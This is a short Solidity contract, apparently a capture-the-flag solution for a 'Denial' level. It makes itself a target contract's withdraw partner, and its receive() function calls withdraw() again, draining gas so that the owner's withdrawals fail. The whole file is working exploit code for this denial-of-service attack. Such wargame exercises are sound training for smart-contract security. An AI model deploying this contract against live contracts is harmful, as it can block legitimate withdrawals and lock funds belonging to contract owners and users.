// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint);
}

contract DenialHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack() external {
        IDenial(target).setWithdrawPartner(address(this));
    }

    receive() external payable {
        IDenial(msg.sender).withdraw();
    }
}
